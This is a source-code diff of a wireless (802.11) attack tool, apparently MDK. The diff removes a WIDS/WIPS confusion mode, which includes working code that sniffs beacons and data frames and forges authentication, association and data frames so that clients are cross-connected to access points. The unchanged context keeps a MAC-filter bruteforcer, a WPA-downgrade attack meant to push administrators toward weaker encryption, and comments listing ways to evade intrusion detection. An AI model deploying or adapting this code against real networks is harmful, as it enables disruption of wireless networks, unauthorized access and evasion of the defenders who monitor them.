@@ -47,14 +47,6 @@
         (ts)->tv_nsec = (tv)->tv_usec * 1000;                           \
 }
 
-struct wids_stats
-{
-    int clients;
-    int aps;
-    int cycles;
-    int deauths;
-} wids_stats;
-
 unsigned char tmpbuf[MAX_PACKET_LENGTH];     // Temp buffer for packet manipulation in send/read_packet
 unsigned char pkt[MAX_PACKET_LENGTH];                // Space to save generated packet
 unsigned char pkt_sniff[MAX_PACKET_LENGTH];          // Space to save sniffed packets
@@ -77,22 +69,6 @@ int real_brute = 0;                          // use Bruteforce mode?
 int init_intelligent = 0;                    // Is intelligent_auth_dos initialized?
 int init_intelligent_data = 0;               // Is its data list initialized?
 int we_got_data = 0;                         // Sniffer thread tells generator thread if there is any data
-struct clist cl;                             // List with clients for intelligent Auth DoS
-struct clist *current = &cl;                 // Pointer to current client
-struct clist a_data;                         // List with data frames for intelligent Auth DoS
-struct clist *a_data_current = &a_data;      // And a pointer to its current frame
-unsigned char *essid;                                // Pointer to ESSID for WIDS confusion
-int essid_len;                               // And its length
-int init_wids = 0;                           // Is WIDS environment ready?
-struct clistwidsap clwa;                     // AP list for WIDS confusion
-struct clistwidsap *clwa_cur = &clwa;        // Current item
-struct clistwidsclient clwc;                 // CLient list for WIDS confusion
-struct clistwidsclient *clwc_cur = &clwc;    // Current item
-struct clistwidsap zc_own;                   // List of own APs for Zero's exploit
-struct clistwidsap *zc_own_cur = &zc_own;    // Current own AP for Zero
-int init_zc_own = 0;                         // Is Zero's List ready?
-int init_aplist = 0;                         // Is List of APs for WIDS confusion ready?
-int init_clientlist = 0;                     // Is list of clients ready?
 struct ether_addr mac_base;                  // First three bytes of adress given for bruteforcing MAC filter
 struct ether_addr mac_lower;                 // Last three bytes of adress for Bruteforcing MAC filter
 int mac_b_init = 0;                          // Initializer for MAC bruteforcer
@@ -104,9 +80,7 @@ static pthread_cond_t clear_packet;          // Pthread Condition "Buffer cleare
 struct timeval tv_dyntimeout;                // Dynamic timeout for MAC bruteforcer
 int mac_brute_speed = 0;                     // MAC Bruteforcer Speed-o-meter
 int mac_brute_timeouts = 0;                  // Timeout counter for MAC Bruteforcer
-int zc_exploit = 0;                          // Use Zero_Chaos attack or standard WDS confusion?
 int hopper_seconds = 1;                      // Default time for channel hopper to stay on one channel
-int useqosexploit = 0;                       // Is 1 when user decided to use better TKIP QoS Exploit
 int wpad_cycles = 0, wpad_auth = 0;          // Counters for WPA downgrade: completed deauth cycles, sniffed 802.1x auth packets
 int wpad_wep = 0, wpad_beacons = 0;          // Counters for WPA downgrade: sniffed WEP/open packets, sniffed beacons/sec
 
@@ -114,9 +88,6 @@ int wpad_wep = 0, wpad_beacons = 0;          // Counters for WPA downgrade: snif
 
 		"TEST MODES:\n"
 
-		"w   - WIDS/WIPS Confusion\n"
-		"      Confuse/Abuse Intrusion Detection and Prevention Systems by\n"
-		"      cross-connecting clients to multiple WDS nodes or fake rogue APs.\n"
 		"f   - MAC filter bruteforce mode\n"
 		"      This test uses a list of known client MAC Adresses and tries to\n"
 		"      authenticate them to the given AP while dynamically changing\n"
@@ -127,16 +98,6 @@ int wpad_wep = 0, wpad_beacons = 0;          // Counters for WPA downgrade: snif
 		"      With this test you can check if the sysadmin will try setting his\n"
 		"      network to WEP or disable encryption. More effective in\n"
 		"      combination with social engineering.\n";
-
-char use_wids[]="w   - WIDS/WIPS/WDS Confusion\n"
-		"      Confuses a WDS with multi-authenticated clients which messes up routing tables\n"
-		"      -e <SSID>\n"
-		"         SSID of target WDS network\n"
-		"      -c [chan,chan,chan...]\n"
-		"         Use channel hopping\n"
-		"      -z\n"
-		"         activate Zero_Chaos' WIDS exploit\n"
-		"         (authenticates clients from a WDS to foreign APs to make WIDS go nuts)\n";
 
 char use_macb[]="f   - MAC filter bruteforce mode\n"
 		"      This test uses a list of known client MAC Adresses and tries to\n"
@@ -164,187 +125,6 @@ char use_wpad[]="g   - WPA Downgrade test\n"
 
 
 /* Sniffing Functions */
-
-
-
-//ATTACK WIDS
-void wids_sniffer()
-{
-    int plen;
-    struct beaconinfo bi;
-    struct clistwidsap *belongsto;
-    struct clistwidsclient *search;
-
-    while (1) {
-	plen = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
-
-	switch (pkt_sniff[0]) {
-	case 0x80: //Beacon frame
-	    bi = parse_beacon(pkt_sniff, plen);
-	    //if (bi.ssid_len != essid_len) break; //Avoid segfaults
-	    if (zc_exploit) { //Zero_Chaos connects to foreign APs
-		if (! memcmp(essid, bi.ssid, essid_len)) { //this is an AP inside the WDS, we just add him to the list
-		    if (!init_zc_own) {
-			init_clistwidsap(&zc_own, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
-			init_zc_own = 1;
-		    } else {
-			if (search_bssid(zc_own_cur, bi.bssid, ETHER_ADDR_LEN) != NULL) break; //AP is known
-			add_to_clistwidsap(zc_own_cur, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
-			printf("\rFound WDS AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
-		    }
-		break;
-		}
-	    } else { //But ASPj's attack does it this way!
-		if (memcmp(essid, bi.ssid, essid_len)) break; //SSID doesn't match
-	    }
-
-	    if (!init_aplist) {
-		init_clistwidsap(&clwa, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
-		init_aplist = 1;
-	    } else {
-		if (search_bssid(clwa_cur, bi.bssid, ETHER_ADDR_LEN) != NULL) break; //AP is known
-		add_to_clistwidsap(clwa_cur, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
-	    }
-	    wids_stats.aps++;
-	    if (zc_exploit) {
-		printf("\rFound foreign AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
-	    } else {
-		printf("\rFound AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
-	    }
-	break;
-
-	case 0x08: //Data frame
-	    if (!init_aplist) break; // If we have found no AP yet, we cannot find any clients belonging to it
-	    unsigned char ds = pkt_sniff[1] & 3;	//Set first 6 bits to 0
-	    unsigned char *bss = NULL;
-	    unsigned char *client = NULL;
-	    switch (ds) {
-	    // p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
-	    case 0:
-		bss = pkt_sniff + 16;
-		client = NULL;	//Ad-hoc network packet - Useless for WIDS
-		break;
-	    // p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
-	    case 1:
-		bss = pkt_sniff + 4;
-		client = pkt_sniff + 10;
-		break;
-	    // p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
-	    case 2:
-		bss = pkt_sniff + 10;
-		client = pkt_sniff + 4;
-		break;
-	    // p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
-	    case 3:
-		bss = pkt_sniff + 10;
-		client = NULL;  //Intra-Distribution-System WDS packet - useless, no client involved
-		break;
-	    }
-	    if (client == NULL) break;  // Drop useless packets
-	    belongsto = search_bssid(clwa_cur, bss, ETHER_ADDR_LEN);
-	    if (zc_exploit) {
-		if (belongsto != NULL) break; //Zero: this client does NOT belong to target WDS, drop it
-		belongsto = search_bssid(zc_own_cur, bss, ETHER_ADDR_LEN);
-		if (belongsto == NULL) break; //Zero: Don't know that AP, drop
-	    } else {
-		if (belongsto == NULL) break; //ASPj: client is NOT in our WDS -> drop
-	    }
-
-	    if (!init_clientlist) {
-		init_clistwidsclient(&clwc, client, 0, ETHER_ADDR_LEN, pkt_sniff, plen, belongsto);
-		init_clientlist = 1;
-	    } else {
-		if (search_client(clwc_cur, client, ETHER_ADDR_LEN) != NULL) break; //Client is known
-		add_to_clistwidsclient(clwc_cur, client, 0, ETHER_ADDR_LEN, pkt_sniff, plen, belongsto);
-	    }
-
-
-	    wids_stats.clients++;
-    	    printf("\rFound Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", client[0], client[1], client[2], client[3], client[4], client[5], belongsto->bssid[0], belongsto->bssid[1], belongsto->bssid[2], belongsto->bssid[3], belongsto->bssid[4], belongsto->bssid[5]);
-	break;
-
-	case 0xB0:  // Authentication Response
-	    search = search_client(clwc_cur, pkt_sniff + 4, ETHER_ADDR_LEN);
-	    if (search == NULL) break;
-	    if (search->status < 1) {	//prevent problems since many APs send multiple responses
-		search->status = 1;
-		search->retry = 0;
-	    }
-	break;
-
-	case 0x10:  // Association Response
-	    search = search_client(clwc_cur, pkt_sniff + 4, ETHER_ADDR_LEN);
-	    if (search == NULL) break;
-	    if (search->status < 2) {	//prevent problems since many APs send multiple responses
-		search->status = 2;
-		search->retry = 0;
-		printf("\rConnected Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", pkt_sniff[4], pkt_sniff[5], pkt_sniff[6], pkt_sniff[7], pkt_sniff[8], pkt_sniff[9], pkt_sniff[16], pkt_sniff[17], pkt_sniff[18], pkt_sniff[19], pkt_sniff[20], pkt_sniff[21]);
-	    }
-	break;
-
-	case 0xC0:  // Deauthentication
-	case 0xA0:  // Disassociation
-	    search = search_client(clwc_cur, pkt_sniff + 4, ETHER_ADDR_LEN);
-	    if (search == NULL) break;
-	    wids_stats.deauths++;
-	break;
-
-        }
-    }
-}
-
-//ATTACK WIDS
-struct pckt get_data_for_wids(struct clistwidsclient *cli)
-{
-
-    struct pckt retn;
-    retn.data = NULL;
-    retn.len = 0;
-
-    unsigned char ds;
-    unsigned char *dst = NULL;
-    unsigned char dest[ETHER_ADDR_LEN];
-
-    //Copy packet out of the list
-    memcpy(tmpbuf, cli->data, cli->data_len);
-
-    //find DST to copy it
-	ds = tmpbuf[1] & 3;		//Set first 6 bits to 0
-	switch (ds) {
-	// p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
-	case 0:
-		dst = tmpbuf + 4;
-		break;
-	// p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
-	case 1:
-		dst = tmpbuf + 16;
-		break;
-	// p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
-	case 2:
-		dst = tmpbuf + 4;
-		break;
-	// p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
-	case 3:
-		dst = tmpbuf + 16;
-		break;
-	}
-    memcpy(dest, dst, ETHER_ADDR_LEN);
-
-    //Set Target, DST, SRC and ToDS correctly
-    memcpy(tmpbuf+4 , cli->bssid->bssid, ETHER_ADDR_LEN);	//BSSID
-    memcpy(tmpbuf+10, cli->mac, ETHER_ADDR_LEN);	//Source
-    memcpy(tmpbuf+16, dest, ETHER_ADDR_LEN);	//Destination
-
-    tmpbuf[1] &= 0xFC;	// Clear DS field
-    tmpbuf[1] |= 0x01;	// Set ToDS bit
-
-    //Return it to have fun with it
-    retn.data = tmpbuf;
-    retn.len = cli->data_len;
-
-    return retn;
-
-}
 
 //ATTACK MAC filter bruteforce
 void mac_bruteforce_sniffer()
@@ -385,11 +165,6 @@ void mac_bruteforce_sniffer()
 }
 
 
-struct pckt wids_machine()
-{
-    int t;
-    struct clistwidsclient *search;
-
 /*  ZERO_CHAOS says: if you want to make the WIDS vendors hate you
     also match the sequence numbers of the victims
     also match the sequence numbers of the victims
@@ -406,75 +181,6 @@ Ghosting (tx power): by changing tx power of the card while injecting, we can ev
 Ghosting (speed/modulation): change speed every few ms, not a fantastic evasion technique but it may cause more location tracking oddity. Note that tx power levels can only be set at certain speeds (lower speed means higher tx power allowed). 
 802.11 allows you to fragment each packet into as many as 16 pieces. It would be nice if we could use fragmentated packets in every aireplay-ng attack.
 */
-
-    if (! init_wids) {
-	// WIDS confusion initialisation
-
-	wids_stats.aps = 0;
-	wids_stats.clients = 0;
-	wids_stats.cycles = 0;
-	wids_stats.deauths = 0;
-
-	printf("\nWaiting 10 seconds for initialization...\n");
-
-	pthread_t sniffer;
-	pthread_create( &sniffer, NULL, (void *) wids_sniffer, (void *) 1);
-
-	for (t=0; t<10; t++) {
-	    sleep(1);
-	    printf("\rAPs found: %d   Clients found: %d", wids_stats.aps, wids_stats.clients);
-	}
-
-	while (!init_aplist) {
-	    printf("\rNo APs have been found yet, waiting...\n");
-	    sleep(5);
-	}
-	while (!init_clientlist) {
-	    printf("\rNo clients found yet. If it doesn't start, maybe you need to fake additional clients with -c\n");
-	    sleep(5);
-	}
-	init_wids = 1;
-    }
-
-    // Move forward some steps
-    char rnd = random() % 13;
-    for (t=0; t<rnd; t++) {
-	clwc_cur = clwc_cur->next;
-	clwa_cur = clwa_cur->next;
-    }
-
-    //Checking for any half open connection
-    search = search_status_widsclient(clwc_cur, 1, osdep_get_channel());
-    if (search != NULL) {  //Found client authed but not assoced
-	if (search->retry > 10) {
-	    search->status = 0;
-	    search->retry = 0;
-	}
-	search->retry++;
-//printf("\rAssociating Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", search->mac[0], search->mac[1], search->mac[2], search->mac[3], search->mac[4], search->mac[5], search->bssid->bssid[0], search->bssid->bssid[1], search->bssid->bssid[2], search->bssid->bssid[3], search->bssid->bssid[4], search->bssid->bssid[5]);
-	return create_assoc_frame_simple(search->bssid->bssid, search->mac, search->bssid->capa, essid, essid_len);
-    }
-    search = search_status_widsclient(clwc_cur, 2, osdep_get_channel());
-    if (search != NULL) {  //Found client assoced but sent no data yet
-	search->status = 0;
-	wids_stats.cycles++;
-	return get_data_for_wids(search);
-    }
-
-    //Chosing current client and connect him to the next AP in the list
-    do {
-	if (zc_exploit) { // Zero: Connecting to foreign AP
-	    clwc_cur->bssid = clwa_cur->next;
-	    clwa_cur = clwa_cur->next;
-	} else { // ASPj: Connecting to WDS AP
-	    clwc_cur->bssid = clwc_cur->bssid->next;
-	}
-    } while (clwc_cur->bssid->channel != osdep_get_channel());
-
-//printf("\rConnecting Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", clwc_cur->mac[0], clwc_cur->mac[1], clwc_cur->mac[2], clwc_cur->mac[3], clwc_cur->mac[4], clwc_cur->mac[5], clwc_cur->bssid->bssid[0], clwc_cur->bssid->bssid[1], clwc_cur->bssid->bssid[2], clwc_cur->bssid->bssid[3], clwc_cur->bssid->bssid[4], clwc_cur->bssid->bssid[5]);
-
-    return create_auth_frame(clwc_cur->bssid->bssid, 0, clwc_cur->mac);
-}
 
 struct pckt mac_bruteforcer()
 {
@@ -660,26 +366,6 @@ struct pckt wpa_downgrade()
 
 /* Response Checkers */
 
-int get_array_index(int array_len, unsigned char *ap)
-{
-// Get index of AP in auth checker array auth[]
-
-    int t;
-
-    for(t=0; t<array_len; t++)
-    {
-	if (! memcmp(auth[t], ap, ETHER_ADDR_LEN)) return t;
-    }
-
-    return -1;
-}
-
-void print_wids_stats()
-{
-    printf("\rAPs found: %d   Clients found: %d   Completed Auth-Cycles: %d   Caught Deauths: %d\n",
-		  wids_stats.aps, wids_stats.clients, wids_stats.cycles, wids_stats.deauths);
-}
-
 void print_mac_bruteforcer_stats(struct pckt packet)
 {
     unsigned char *m = packet.data+10;
@@ -732,29 +418,7 @@ void print_stats(char mode, struct pckt packet, int responses, int sent)
 
     switch (mode)
     {
-    case 'b':
-    case 'B':
-	print_beacon_stats(packet);
-	break;
-    case 'a':
-    case 'A':
-	print_auth_stats(packet);
-	break;
-    case 'p':
-	print_probe_stats(responses, sent);
-	break;
-    case 'd':
-	print_deauth_stats(packet);
-	break;
-    case 'P':
-	print_ssid_brute_stats(packet);
-	break;
-    case 'i':
-	print_intelligent_auth_dos_stats();
-	break;
-    case 'w':
-	print_wids_stats();
-	break;
+
     case 'f':
 	print_mac_bruteforcer_stats(packet);
 	break;
@@ -798,33 +462,6 @@ int mdk_parser(int argc, char *argv[])
     t_prev = (time_t) malloc(sizeof(t_prev));
 
 
-    case 'w':
-	mode = 'w';
-	for (t=3; t<argc; t++)
-	{
-	    if (! strcmp(argv[t], "-e")) if (argc > t+1) {
-		essid_len = strlen(argv[t+1]);
-		essid = (unsigned char *) malloc(essid_len);
-		memcpy(essid, argv[t+1], essid_len);
-		got_ssid = 1;
-	    }
-	    if (! strcmp(argv[t], "-c")) {
-		if (argc > t+1) {
-		    // There is a channel list given
-		    init_channel_hopper(argv[t+1], 1);
-		} else {
-		    // No list given
-		    init_channel_hopper(NULL, 1);
-		}
-	    }
-	    if (! strcmp(argv[t], "-z")) {
-		// Zero_Chaos attack
-		zc_exploit = 1;
-	    }
-	}
-    break;
-
-
     case 'f':
         mode = 'f';
         usespeed = 0;
@@ -866,12 +503,6 @@ int mdk_parser(int argc, char *argv[])
 
     printf("\n");
 
-    
-    if ((mode == 'w') && (got_ssid == 0)) {
-	printf("Please specify a target ESSID!\n\n");
-	printf(use_wids);
-	return -1;
-    }
 
     if (mode == 'g') {
 	if (target == NULL) {
@@ -890,9 +521,6 @@ int mdk_parser(int argc, char *argv[])
 	switch (mode)
 	{
 
-	case 'w':
-	    frm = wids_machine();
-	    break;
 	case 'f':
 	    frm = mac_bruteforcer();
 	    break;
